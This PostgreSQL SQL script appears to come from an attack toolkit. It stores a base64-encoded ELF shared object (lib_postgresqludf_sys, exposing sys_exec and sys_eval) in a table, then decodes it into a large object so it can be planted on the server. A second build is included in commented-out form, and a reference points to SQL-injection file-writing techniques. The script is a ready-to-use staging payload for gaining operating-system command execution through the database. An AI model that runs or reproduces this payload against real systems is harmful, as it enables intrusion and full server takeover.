-- Notes:
-- 
-- The SO compiled using PostgreSQL 8.3 C libraries differs from the one
-- compiled using PostgreSQL 8.2 C libraries
-- 
-- SO compiled using PostgreSQL 8.3 C libraries
-- lib_postgresqludf_sys.so: 8567 bytes (ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, not stripped)
-- lib_postgresqludf_sys.so: 5476 bytes (ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, stripped)
-- 
-- SO compiled using PostgreSQL 8.2 C libraries
-- lib_postgresqludf_sys.so: 8567 bytes (ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, not stripped)
-- lib_postgresqludf_sys.so: 5476 bytes (ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, stripped)
-- 
-- Little hack to compress the shared object:
-- * Compile with -O1 the shared object
-- * Use strip to remove all symbols (-s) and non-global symbols (-x)


-- Create a table with one field data-type text
DROP TABLE IF EXISTS udftest;
CREATE TABLE udftest(data text);


-- Insert the base64 encoded UDF in the table

-- SO compiled using PostgreSQL 8.3 C libraries
INSERT INTO udftest(data) VALUES ('f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAYAYAADQAAAB8EQAAAAAAADQAIAAFACgAGQAYAAEAAAAAAAAAAAAAAAAAAAD4CQAA+AkAAAUAAAAAEAAAAQAAAAQPAAAEHwAABB8AAAgBAAAQAQAABgAAAAAQAAACAAAAGA8AABgfAAAYHwAA0AAAANAAAAAGAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAUuV0ZAQPAAAEHwAABB8AAPwAAAD8AAAABAAAAAEAAAARAAAAGgAAAAAAAAANAAAAAAAAAAQAAAAAAAAAAgAAAAcAAAAAAAAAFQAAABcAAAAOAAAADwAAAAwAAAATAAAACAAAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAwAAAAUAAAAAAAAAEgAAABgAAAAAAAAACQAAABQAAAALAAAAFgAAAAAAAAAAAAAAAAAAABkAAAAAAAAACgAAAAAAAAAQAAAAAAAAABEAAAADAAAAEAAAAAIAAAAGAAAAiACgAQTNRFkQAAAAFgAAABgAAAAuZ1QeqGi+EqpfvhK645J8QkXV7DNeVB7YcVgcuY3xDurT7w7HDabUAAAAAAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAABIAAADLAAAAAAAAAAAAAAAQAAAAAQAAAAAAAAAAAAAAIAAAACsAAAAAAAAAAAAAACAAAACWAAAAAAAAAAAAAAASAAAAxAAAAAAAAAAAAAAAEgAAAJ4AAAAAAAAAAAAAABIAAACmAAAAAAAAAAAAAAASAAAAzAAAAAAAAAAAAAAAEgAAAIkAAAAAAAAAAAAAABIAAACCAAAAAAAAAAAAAAASAAAAswAAAAAAAAAAAAAAEgAAABwAAAAAAAAAA');
UPDATE udftest SET data=data||'AAAACIAAACsAAAAAAAAAAAAAAASAAAAcQAAAAAAAAAAAAAAEAAAAE0AAAAmBwAACgAAABIACwBWAAAAAAkAAHwAAAASAAsAaAAAADoHAADGAQAAEgALAO4AAAAUIAAAAAAAABAA8f/bAAAADCAAAAAAAAAQAPH/XwAAADAHAAAKAAAAEgALAOIAAAAMIAAAAAAAABAA8f8QAAAA+AUAAAAAAAASAAkAFgAAALgJAAAAAAAAEgAMAD8AAAAcBwAACgAAABIACwAAX19nbW9uX3N0YXJ0X18AX2luaXQAX2ZpbmkAX19jeGFfZmluYWxpemUAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBQZ19tYWdpY19mdW5jAHBnX2ZpbmZvX3N5c19leGVjAHBnX2ZpbmZvX3N5c19ldmFsAHBnX2RldG9hc3RfZGF0dW0AbWFsbG9jAG1lbWNweQBwb3BlbgByZWFsbG9jAHN0cm5jcHkAZmdldHMAcGNsb3NlAF9fc3RhY2tfY2hrX2ZhaWwAc3lzdGVtAHBmcmVlAGxpYmMuc28uNgBfZWRhdGEAX19ic3Nfc3RhcnQAX2VuZABHTElCQ18yLjEuMwBHTElCQ18yLjQAR0xJQkNfMi4wAEdMSUJDXzIuMQAAAAACAAAAAAAAAAMAAwADAAMAAwADAAMABAAFAAIAAAABAAEAAQABAAEAAQABAAEAAQABAAAAAQAEANEAAAAQAAAAAAAAAHMfaQkAAAUA8wAAABAAAAAUaWkNAAAEAP8AAAAQAAAAEGlpDQAAAwAJAQAAEAAAABFpaQ0AAAIAEwEAAAAAAAAgBwAACAAAACoHAAAIAAAANAcAAAgAAACjBwAACAAAAAggAAAIAAAAWwcAAAIPAAAZCQAAAg8AAHAHAAACCwAAlQ';
UPDATE udftest SET data=data||'cAAAILAACNCAAAAgsAAC4JAAACCwAAhQcAAAIKAADaCAAAAgoAAEMJAAACCgAAqwcAAAIBAADwBwAAAgUAABgIAAACBwAAPggAAAIIAABUCAAAAg4AAPEIAAACDAAATwkAAAIGAABZCQAAAgkAAGkJAAACAgAA6B8AAAYDAADsHwAABgQAAPAfAAAGDQAAACAAAAcDAAAEIAAABw0AAFWJ5VOD7AToAAAAAFuBw/AZAACLk/T///+F0nQF6B4AAADowQAAAOhcAwAAWFvJw/+zBAAAAP+jCAAAAAAAAAD/owwAAABoAAAAAOng/////6MQAAAAaAgAAADp0P///wAAAAAAAAAAVYnlVlPorQAAAIHDihkAAIPsEIC7GAAAAAB1XYuD/P///4XAdA6LgxQAAACJBCTotP///4uLHAAAAI2DHP///42TGP///ynQwfgCjXD/OfFzII22AAAAAI1BAYmDHAAAAP+Ugxj///+LixwAAAA58XLmxoMYAAAAAYPEEFteXcNVieVT6C4AAACBwwsZAACD7ASLkyD///+F0nQVi5P4////hdJ0C42DIP///4kEJP/Sg8QEW13Dixwkw5BVieW44AkAAF3DVYnluNwJAABdw1WJ5bjYCQAAXcNVieVXVlOB7CwEAABloRQAAACJRfAxwItFCItAEIkEJOj8////iceLAMHoAo1w/IPoA4kEJOj8////icONRwSJdCQIiUQkBIkcJOj8////xgQzAMcEJAEAAADo/P///4mF2Pv//8dEJATUCQAAiRwk6Pz///+Jhdz7///HheD7//8AAAAA62GNvfD7//+4AAAAALn/////8q6JyPfQjXD/i53g+///AfOJXCQEi5XY+///iRQk6Pz///+Jhdj7//+JdCQIjYXw+///iUQ';
UPDATE udftest SET data=data||'kBIuF2Pv//wOF4Pv//4kEJOj8////iZ3g+///i5Xc+///iVQkCMdEJAQABAAAjYXw+///iQQk6Pz///+FwA+Fd////4uV3Pv//4kUJOj8////i4XY+///gDgAdAuLleD7///GRBD/AL7/////i73Y+///uwAAAACJ8YnY8q730YPBA4kMJOj8////iYXU+///i73Y+///ifGJ2PKu99GNDI0MAAAAi5XU+///iQqLvdj7//+J8fKu99GD6QGJ0IPABIlMJAiLldj7//+JVCQEiQQk6Pz///+LhdT7//+LVfBlMxUUAAAAdAXo/P///4HELAQAAFteX13DVYnlg+wYiV30iXX4iX38i1UIi0IQiQQk6Pz///+Jx4sAwegCjXD8g+gDiQQk6Pz///+Jw41HBIl0JAiJRCQEiRwk6Pz////GBDMAiRwk6Pz///+JxokcJOj8////i0UIO3gQdAiJPCTo/P///4nwi130i3X4i338iexdw5CQkJBVieVWU+iN/f//gcNqFgAAi4MQ////g/j/dBmNsxD///+NtCYAAAAAg+4E/9CLBoP4/3X0W15dw1WJ5VOD7AToAAAAAFuBwzAWAADokPz//1lbycNyAAAAAQAAAAEAAAAUAAAAIwMAAGQAAAAgAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
UPDATE udftest SET data=data||'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
UPDATE udftest SET data=data||'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP////8AAAAA/////wAAAAAAAAAAAQAAANEAAAAMAAAA+AUAAA0AAAC4CQAABAAAANQAAAD1/v9viAEAAAUAAAB0AwAABgAAANQBAAAKAAAAHQEAAAsAAAAQAAAAAwAAAPQfAAACAAAAEAAAABQAAAARAAAAFwAAAOgFAAARAAAAGAUAABIAAADQAAAAEwAAAAgAAAAWAAAAAAAAAP7//2/IBAAA////bwEAAADw//9vkgQAAPr//28FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgfAAAAAAAAAAAAAD4GAABOBgAACCAAAA';
UPDATE udftest SET data=data||'BHQ0M6IChVYnVudHUgNC4zLjItMXVidW50dTEyKSA0LjMuMgAAR0NDOiAoVWJ1bnR1IDQuMy4yLTF1YnVudHUxMikgNC4zLjIAAEdDQzogKFVidW50dSA0LjMuMi0xdWJ1bnR1MTIpIDQuMy4yAABHQ0M6IChVYnVudHUgNC4zLjItMXVidW50dTEyKSA0LjMuMgAAR0NDOiAoVWJ1bnR1IDQuMy4yLTF1YnVudHUxMikgNC4zLjIAAC5zaHN0cnRhYgAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsLmR5bgAucmVsLnBsdAAuaW5pdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZQAuY3RvcnMALmR0b3JzAC5qY3IALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAFAAAAAgAAANQAAADUAAAAtAAAAAMAAAAAAAAABAAAAAQAAAALAAAA9v//bwIAAACIAQAAiAEAAEwAAAADAAAAAAAAAAQAAAAEAAAAFQAAAAsAAAACAAAA1AEAANQBAACgAQAABAAAAAEAAAAEAAAAEAAAAB0AAAADAAAAAgAAAHQDAAB0AwAAHQEAAAAAAAAAAAAAAQAAAAAAAAAlAAAA////bwIAAACSBAAAkgQAADQAAAADAAAAAAAAAAIAAAACAAAAMgAAAP7//28CAAAAyAQAAMgEAABQAAAABAAAAAEAAAAEAAAAAAAAAEEAAAAJAAAAAgAAABgFAAAYBQAA0AAAAAMAAAAAAAAABAAAAAg';
UPDATE udftest SET data=data||'AAABKAAAACQAAAAIAAADoBQAA6AUAABAAAAADAAAACgAAAAQAAAAIAAAAUwAAAAEAAAAGAAAA+AUAAPgFAAAwAAAAAAAAAAAAAAAEAAAAAAAAAE4AAAABAAAABgAAACgGAAAoBgAAMAAAAAAAAAAAAAAABAAAAAQAAABZAAAAAQAAAAYAAABgBgAAYAYAAFgDAAAAAAAAAAAAABAAAAAAAAAAXwAAAAEAAAAGAAAAuAkAALgJAAAcAAAAAAAAAAAAAAAEAAAAAAAAAGUAAAABAAAAAgAAANQJAADUCQAAIAAAAAAAAAAAAAAABAAAAAAAAABtAAAAAQAAAAIAAAD0CQAA9AkAAAQAAAAAAAAAAAAAAAQAAAAAAAAAdwAAAAEAAAADAAAABB8AAAQPAAAIAAAAAAAAAAAAAAAEAAAAAAAAAH4AAAABAAAAAwAAAAwfAAAMDwAACAAAAAAAAAAAAAAABAAAAAAAAACFAAAAAQAAAAMAAAAUHwAAFA8AAAQAAAAAAAAAAAAAAAQAAAAAAAAAigAAAAYAAAADAAAAGB8AABgPAADQAAAABAAAAAAAAAAEAAAACAAAAJMAAAABAAAAAwAAAOgfAADoDwAADAAAAAAAAAAAAAAABAAAAAQAAACYAAAAAQAAAAMAAAD0HwAA9A8AABQAAAAAAAAAAAAAAAQAAAAEAAAAoQAAAAEAAAADAAAACCAAAAgQAAAEAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAAIAAAAAwAAAAwgAAAMEAAACAAAAAAAAAAAAAAABAAAAAAAAACsAAAAAQAAAAAAAAAAAAAADBAAALkAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAMAAAAAAAAAAAAAAMUQAAC1AAAAAAAAAAAAAAABAAAAAAAAAA==';

-- SO compiled using PostgreSQL 8.2 C libraries
-- INSERT INTO udftest(data) VALUES ('f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAYAYAADQAAAB8EQAAAAAAADQAIAAFACgAGQAYAAEAAAAAAAAAAAAAAAAAAAD4CQAA+AkAAAUAAAAAEAAAAQAAAAQPAAAEHwAABB8AAAgBAAAQAQAABgAAAAAQAAACAAAAGA8AABgfAAAYHwAA0AAAANAAAAAGAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAUuV0ZAQPAAAEHwAABB8AAPwAAAD8AAAABAAAAAEAAAARAAAAGgAAAAAAAAANAAAAAAAAAAQAAAAAAAAAAgAAAAcAAAAAAAAAFQAAABcAAAAOAAAADwAAAAwAAAATAAAACAAAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAwAAAAUAAAAAAAAAEgAAABgAAAAAAAAACQAAABQAAAALAAAAFgAAAAAAAAAAAAAAAAAAABkAAAAAAAAACgAAAAAAAAAQAAAAAAAAABEAAAADAAAAEAAAAAIAAAAGAAAAiACgAQTNRFkQAAAAFgAAABgAAAAuZ1QeqGi+EqpfvhK645J8QkXV7DNeVB7YcVgcuY3xDurT7w7HDabUAAAAAAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAABIAAADLAAAAAAAAAAAAAAAQAAAAAQAAAAAAAAAAAAAAIAAAACsAAAAAAAAAAAAAACAAAACWAAAAAAAAAAAAAAASAAAAxAAAAAAAAAAAAAAAEgAAAJ4AAAAAAAAAAAAAABIAAACmAAAAAAAAAAAAAAASAAAAzAAAAAAAAAAAAAAAEgAAAIkAAAAAAAAAAAAAABIAAACCAAAAAAAAAAAAAAASAAAAswAAAAAAAAAAAAAAEgAAABwAAAAAAAAAA');
-- UPDATE udftest SET data=data||'AAAACIAAACsAAAAAAAAAAAAAAASAAAAcQAAAAAAAAAAAAAAEAAAAE0AAAAmBwAACgAAABIACwBWAAAA/ggAAH4AAAASAAsAaAAAADoHAADEAQAAEgALAO4AAAAUIAAAAAAAABAA8f/bAAAADCAAAAAAAAAQAPH/XwAAADAHAAAKAAAAEgALAOIAAAAMIAAAAAAAABAA8f8QAAAA+AUAAAAAAAASAAkAFgAAALgJAAAAAAAAEgAMAD8AAAAcBwAACgAAABIACwAAX19nbW9uX3N0YXJ0X18AX2luaXQAX2ZpbmkAX19jeGFfZmluYWxpemUAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBQZ19tYWdpY19mdW5jAHBnX2ZpbmZvX3N5c19leGVjAHBnX2ZpbmZvX3N5c19ldmFsAHBnX2RldG9hc3RfZGF0dW0AbWFsbG9jAG1lbWNweQBwb3BlbgByZWFsbG9jAHN0cm5jcHkAZmdldHMAcGNsb3NlAF9fc3RhY2tfY2hrX2ZhaWwAc3lzdGVtAHBmcmVlAGxpYmMuc28uNgBfZWRhdGEAX19ic3Nfc3RhcnQAX2VuZABHTElCQ18yLjEuMwBHTElCQ18yLjQAR0xJQkNfMi4wAEdMSUJDXzIuMQAAAAACAAAAAAAAAAMAAwADAAMAAwADAAMABAAFAAIAAAABAAEAAQABAAEAAQABAAEAAQABAAAAAQAEANEAAAAQAAAAAAAAAHMfaQkAAAUA8wAAABAAAAAUaWkNAAAEAP8AAAAQAAAAEGlpDQAAAwAJAQAAEAAAABFpaQ0AAAIAEwEAAAAAAAAgBwAACAAAACoHAAAIAAAANAcAAAgAAAClBwAACAAAAAggAAAIAAAAWwcAAAIPAAAXCQAAAg8AAHIHAAACCwAAlw';
-- UPDATE udftest SET data=data||'cAAAILAACPCAAAAgsAAC4JAAACCwAAhwcAAAIKAADYCAAAAgoAAEMJAAACCgAArQcAAAIBAADyBwAAAgUAABoIAAACBwAAQAgAAAIIAABWCAAAAg4AAO8IAAACDAAATwkAAAIGAABZCQAAAgkAAGkJAAACAgAA6B8AAAYDAADsHwAABgQAAPAfAAAGDQAAACAAAAcDAAAEIAAABw0AAFWJ5VOD7AToAAAAAFuBw/AZAACLk/T///+F0nQF6B4AAADowQAAAOhcAwAAWFvJw/+zBAAAAP+jCAAAAAAAAAD/owwAAABoAAAAAOng/////6MQAAAAaAgAAADp0P///wAAAAAAAAAAVYnlVlPorQAAAIHDihkAAIPsEIC7GAAAAAB1XYuD/P///4XAdA6LgxQAAACJBCTotP///4uLHAAAAI2DHP///42TGP///ynQwfgCjXD/OfFzII22AAAAAI1BAYmDHAAAAP+Ugxj///+LixwAAAA58XLmxoMYAAAAAYPEEFteXcNVieVT6C4AAACBwwsZAACD7ASLkyD///+F0nQVi5P4////hdJ0C42DIP///4kEJP/Sg8QEW13Dixwkw5BVieW44AkAAF3DVYnluNwJAABdw1WJ5bjYCQAAXcNVieVXVlOB7CwEAABloRQAAACJRfAxwItFCItAEIkEJOj8////iceLACX///8/jXD8g+gDiQQk6Pz///+Jw41HBIl0JAiJRCQEiRwk6Pz////GBDMAxwQkAQAAAOj8////iYXY+///x0QkBNQJAACJHCTo/P///4mF3Pv//8eF4Pv//wAAAADrYY298Pv//7gAAAAAuf/////yronI99CNcP+LneD7//8B84lcJASLldj7//+JFCTo/P///4mF2Pv//4l0JAiNhfD7//+';
-- UPDATE udftest SET data=data||'JRCQEi4XY+///A4Xg+///iQQk6Pz///+JneD7//+Lldz7//+JVCQIx0QkBAAEAACNhfD7//+JBCTo/P///4XAD4V3////i5Xc+///iRQk6Pz///+Lhdj7//+AOAB0C4uV4Pv//8ZEEP8Avv////+Lvdj7//+7AAAAAInxidjyrvfRg8EDiQwk6Pz///+JhdT7//+Lvdj7//+J8YnY8q730YPBA4uV1Pv//4kKi73Y+///ifHyrvfRg+kBidCDwASJTCQIi5XY+///iVQkBIkEJOj8////i4XU+///i1XwZTMVFAAAAHQF6Pz///+BxCwEAABbXl9dw1WJ5YPsGIld9Il1+Il9/ItVCItCEIkEJOj8////iceLACX///8/jXD8g+gDiQQk6Pz///+Jw41HBIl0JAiJRCQEiRwk6Pz////GBDMAiRwk6Pz///+JxokcJOj8////i0UIO3gQdAiJPCTo/P///4nwi130i3X4i338iexdw5CQkJBVieVWU+iN/f//gcNqFgAAi4MQ////g/j/dBmNsxD///+NtCYAAAAAg+4E/9CLBoP4/3X0W15dw1WJ5VOD7AToAAAAAFuBwzAWAADokPz//1lbycNyAAAAAQAAAAEAAAAUAAAAIgMAAGQAAAAgAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
-- UPDATE udftest SET data=data||'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
-- UPDATE udftest SET data=data||'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP////8AAAAA/////wAAAAAAAAAAAQAAANEAAAAMAAAA+AUAAA0AAAC4CQAABAAAANQAAAD1/v9viAEAAAUAAAB0AwAABgAAANQBAAAKAAAAHQEAAAsAAAAQAAAAAwAAAPQfAAACAAAAEAAAABQAAAARAAAAFwAAAOgFAAARAAAAGAUAABIAAADQAAAAEwAAAAgAAAAWAAAAAAAAAP7//2/IBAAA////bwEAAADw//9vkgQAAPr//28FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgfAAAAAAAAAAAAAD4GAABOBgAACCAAAA';
-- UPDATE udftest SET data=data||'BHQ0M6IChVYnVudHUgNC4zLjItMXVidW50dTEyKSA0LjMuMgAAR0NDOiAoVWJ1bnR1IDQuMy4yLTF1YnVudHUxMikgNC4zLjIAAEdDQzogKFVidW50dSA0LjMuMi0xdWJ1bnR1MTIpIDQuMy4yAABHQ0M6IChVYnVudHUgNC4zLjItMXVidW50dTEyKSA0LjMuMgAAR0NDOiAoVWJ1bnR1IDQuMy4yLTF1YnVudHUxMikgNC4zLjIAAC5zaHN0cnRhYgAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsLmR5bgAucmVsLnBsdAAuaW5pdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZQAuY3RvcnMALmR0b3JzAC5qY3IALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAFAAAAAgAAANQAAADUAAAAtAAAAAMAAAAAAAAABAAAAAQAAAALAAAA9v//bwIAAACIAQAAiAEAAEwAAAADAAAAAAAAAAQAAAAEAAAAFQAAAAsAAAACAAAA1AEAANQBAACgAQAABAAAAAEAAAAEAAAAEAAAAB0AAAADAAAAAgAAAHQDAAB0AwAAHQEAAAAAAAAAAAAAAQAAAAAAAAAlAAAA////bwIAAACSBAAAkgQAADQAAAADAAAAAAAAAAIAAAACAAAAMgAAAP7//28CAAAAyAQAAMgEAABQAAAABAAAAAEAAAAEAAAAAAAAAEEAAAAJAAAAAgAAABgFAAAYBQAA0AAAAAMAAAAAAAAABAAAAAg';
-- UPDATE udftest SET data=data||'AAABKAAAACQAAAAIAAADoBQAA6AUAABAAAAADAAAACgAAAAQAAAAIAAAAUwAAAAEAAAAGAAAA+AUAAPgFAAAwAAAAAAAAAAAAAAAEAAAAAAAAAE4AAAABAAAABgAAACgGAAAoBgAAMAAAAAAAAAAAAAAABAAAAAQAAABZAAAAAQAAAAYAAABgBgAAYAYAAFgDAAAAAAAAAAAAABAAAAAAAAAAXwAAAAEAAAAGAAAAuAkAALgJAAAcAAAAAAAAAAAAAAAEAAAAAAAAAGUAAAABAAAAAgAAANQJAADUCQAAIAAAAAAAAAAAAAAABAAAAAAAAABtAAAAAQAAAAIAAAD0CQAA9AkAAAQAAAAAAAAAAAAAAAQAAAAAAAAAdwAAAAEAAAADAAAABB8AAAQPAAAIAAAAAAAAAAAAAAAEAAAAAAAAAH4AAAABAAAAAwAAAAwfAAAMDwAACAAAAAAAAAAAAAAABAAAAAAAAACFAAAAAQAAAAMAAAAUHwAAFA8AAAQAAAAAAAAAAAAAAAQAAAAAAAAAigAAAAYAAAADAAAAGB8AABgPAADQAAAABAAAAAAAAAAEAAAACAAAAJMAAAABAAAAAwAAAOgfAADoDwAADAAAAAAAAAAAAAAABAAAAAQAAACYAAAAAQAAAAMAAAD0HwAA9A8AABQAAAAAAAAAAAAAAAQAAAAEAAAAoQAAAAEAAAADAAAACCAAAAgQAAAEAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAAIAAAAAwAAAAwgAAAMEAAACAAAAAAAAAAAAAAABAAAAAAAAACsAAAAAQAAAAAAAAAAAAAADBAAALkAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAMAAAAAAAAAAAAAAMUQAAC1AAAAAAAAAAAAAAABAAAAAAAAAA==';


-- Create a new OID for a large object, it implicitly adds an entry in the
-- PostgreSQL large objects system table
-- 
-- References:
-- http://www.postgresql.org/docs/8.3/interactive/largeobjects.html
-- http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html
SELECT lo_unlink(35817);
SELECT lo_create(35817);


-- Update the PostgreSQL system large objects table assigning to the just
-- created OID the binary (base64 decoded) UDF as data
-- 
-- Refereces:
-- http://lab.lonerunners.net/blog/sqli-writing-files-to-disk-under-postgresql
UPDATE pg_largeobject SET data=(DECODE((SELECT data FROM udftest), 'base64')) WHERE loid=35817;


